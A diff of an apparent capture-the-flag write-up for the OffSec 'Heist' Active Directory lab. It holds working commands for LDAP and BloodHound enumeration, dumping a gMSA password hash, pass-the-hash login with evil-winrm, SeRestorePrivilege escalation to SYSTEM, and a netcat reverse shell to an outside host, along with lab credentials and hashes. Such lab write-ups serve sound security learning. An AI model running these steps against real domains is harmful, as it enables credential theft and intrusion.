@@ -142,6 +142,11 @@ HEIST\Web Admins                            Group            S-1-5-21-537427935-
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 ```
+
+sAMAccountName (Security Accounts Manager Account Name) is a core attribute in Microsoft Active Directory (AD) used to store the logon name for a user, computer, or group in legacy formats (pre-Windows 2000).
+
+I use ldapsearch to find any user, group in this AD domain.
+
 `└─$ ldapsearch -x -H ldap://heist.offsec -D 'enox@heist.offsec' -W -b 'DC=heist,DC=offsec' "(objectClass=msDS-GroupManagedServiceAccount)" sAMAccountName`
 ```
 Enter LDAP Password: 
@@ -174,7 +179,8 @@ result: 0 Success
 # numEntries: 1
 # numReferences: 3
 ```
-try to use bloodhound enumerate the AD
+
+I got a service svc_apache account try to use bloodhound enumerate the AD
 
 `└─$ bloodhound-python -d heist.offsec -dc dc01.heist.offsec -u enox -p 'california' -c All -v -ns 192.168.245.165 --zip`
 ```
@@ -184,23 +190,51 @@ INFO: Compressing output into 20260730115912_bloodhound.zip
 enox -memof--> web admins --ReadGMSAPassword--> svc_apache
 
 and group web admins is definitely in the AD, so next we will get password
+
 https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword
 
-Method1: on kali use bloodyad to get the hash
+#### Lateral Move
+Method1: on kali use bloodyad to get the gMSA password
+
 `└─$ bloodyad --host 192.168.245.165 -d heist.offsec -u enox -p "california" get object SVC_APACHE$ --attr msDS-ManagedPassword`
 ```
 distinguishedName: CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
 msDS-ManagedPassword.NT: 1169a68c02b287c7d88ce7e512acbee7
 msDS-ManagedPassword.B64ENCODED: nmPqvoV6B/MMlbvC4HyHSbRzec6rKegAxL9C5+M/BK5BDuyd0rpxy35MBZNMUGqSL6a2hEvzCmqlf0tFDKZfptRtZtE317h+bzJNzcBI6OKGmkOkvejDySH8UsiEI7xQ0lifHbD2XADxjvB7bL1SOikkEvWP3Vlgbgo99rD1+bkya2P+Uhx2Dx38thwRuBtO4kEVo+oX/ExtTzub1Gb99Vw9rF1wyulmUtTh3nAn8ZYQ9JfkGaaPy3l/qLhlSQaOzmASBfz1EvNdwGskp0OJbq9e7RMfNacPsWsjsRFj+h71aQmmDEtf2zaPc9akHYcuoVRGwpAy4XbgxpDBKGwaRA==
 ```
-pass the hash to  winrm to the host
+
+Method2: use ldeep to get the gMSA password blobs the user can access and parses the values
+
+└─$ ldeep ldap -d heist.offsec -s 192.168.154.165 -u enox -p 'california' gmsa -t SVC_APACHE$
+svc_apache$:nthash:1169a68c02b287c7d88ce7e512acbee7
+svc_apache$:aes128-cts-hmac-sha1-96:3dcc7e89fb7671276eb0ccd25b12f9cf
+svc_apache$:aes256-cts-hmac-sha1-96:b59b86b465c3d47a6a1036b332e0776426f6e5f3790195461a171e1d9326517a
+svc_apache$:reader:DC01$
+svc_apache$:reader:Web Admins (group)
+
+pass the hash to winrm to the host
 
 `└─$ evil-winrm -i 192.168.245.165 -u svc_apache$ -H 1169a68c02b287c7d88ce7e512acbee7`
 
+#### Priv Escalate
 
-Method2: SeRestoreAbuse priv, on target machine, use powershell tool 
+`*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv`
+```
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+SeRestoreAbuse priv, on target machine, use powershell tool 
 
 https://medium.com/@pankajaditya/privilege-escalation-abusing-dangerous-privileges-sebackup-serestore-e360309da4a7
+
 https://github.com/0x4D-5A/Invoke-SeRestoreAbuse
 
 `Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "whoami > C:\Users\svc_apache$\Documents\a.txt"'`
@@ -208,7 +242,8 @@ https://github.com/0x4D-5A/Invoke-SeRestoreAbuse
 *Evil-WinRM* PS C:\Users\svc_apache$\Documents> type a.txt
 nt authority\system
 ```
-it works, so we ser reverse shell to payload
+
+it works, so we set reverse shell to payload
 
 `Invoke-SeRestoreAbuse -Command 'cmd /c powershell -c "C:\Users\svc_apache$\Documents\nc64.exe 192.168.45.175 8821 -e cmd"'`
 ```
@@ -224,3 +259,8 @@ Info: Upload successful!
 [+] ImagePath set to: cmd /c powershell -c "C:\Users\svc_apache$\Documents\nc64.exe 192.168.45.175 8821 -e cmd"
 ```
 
+#### Lesson learned
+- Use responder to get info the AD service may sent
+- use ldapsearch to find sAMAccountName in domain
+- ReadGMSAPassword use, to get NTLM hash, and then pass the hash to login domain
+- SeRestoreAbuse use, to get admin
